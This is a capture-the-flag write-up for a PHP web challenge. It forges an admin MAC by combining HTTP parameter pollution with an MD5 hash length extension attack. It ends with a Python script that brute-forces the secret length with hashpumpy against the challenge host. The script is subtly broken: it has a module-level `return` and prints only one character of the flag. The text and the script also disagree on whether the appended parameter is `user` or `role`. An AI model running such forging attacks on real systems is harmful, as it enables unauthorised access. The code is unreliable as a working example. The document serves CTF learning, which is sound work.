# 20. ambrosia

Author: ric0

Phase 2 | webex

Flag: `labyrinth{Ju5t_4dd_3xtr4_p4r4m5_5om3t1m35}`

## Description

why are so many things always hashed?
Anyway, hashes are one way, you can't add anything right?
I used PHP btw. 

flag has to be wrapped in the wrapper labyrinth{}

## Solve

- The website opens to a page that hints towards a "secret ingredient" which is available only to the admin
- when you do go to the link, there are 2 parameters following recipe in the url: `recipe?data=726f6c653d75736572&mac=66b1cab64177796b266b3b51780c2d67`
- the home page makes it clear that these two parameters are being used to verify your identity
- the data parameter `726f6c653d75736572` is hex and decodes to ascii text to give `role=user`.
- by checking out the code snippet given, it is clear that the mac is clearly the md5 of the bytes of some (secret (size unkown) + role=user)
- upon looking up how web authentication works, you can deduce that the server actually performs the md5 hash of the secret + role parameter  value. If  it is equal to the value in the mac parameter, only then it authenticates you.
- However without knowing the secret, you cannot forge the md5 hash of role=admin.
- The description mentions the use of PHP. If you check the way php works, you realise that it has a characteristic which can be a vulnerability: [http parameter pollution](https://medium.com/@0UN390/what-is-http-parameter-pollution-a50249869d97)
- thus we can add another user paramter. This is good news if you know about md5 hash length extension attack.
- hash length extension attack allows you to add to the text to the hash without knowing the secret (a common web vulnerability. Thus you can extend the hash (with proper padding) to include `&user=admin`
- This brings us to the next obstacle: finding the length of the key. Packages like `hashpumpy` require the length of the key, which we do not know
- The simple solution to this is to just brute it, try different lengths till the reponse includes the phrase `labyrinth{` which you would know at this point to be the wrapper for the flag.
- We can use a script to automate this

```python
import hashpumpy
import requests

BASE_URL = "https://ambrosia.labyrinthctf.live/recipe"

datahex = "726f6c653d75736572"
mac = "66b1cab64177796b266b3b51780c2d67"
add = b"&role=admin"
MAX_KEY = 32
data = bytes.fromhex(datahex)
session = requests.Session()

for kl in range(0, MAX_KEY + 1):
    new_mac, new_data = hashpumpy.hashpump(
        mac, data, add, kl
    )

    data_hex = new_data.hex()
    resp = session.get(BASE_URL, params={"data": data_hex, "mac": new_mac}, timeout=10)

    if resp.status_code == 403:
        continue  

    if "labyrinth{" in resp.text:
        print(f"Key length ={kl}")
        print(f"data = {data_hex}")
        print(f"mac = {new_mac}")
        print(f"URL = {BASE_URL}?data={data_hex}&mac={new_mac}")
        start = resp.text.find("labyrinth{")
        if start != -1:
            print(f"FLAG = {resp.text[start]}")
        return

print("Nothing worked longer key.")
```
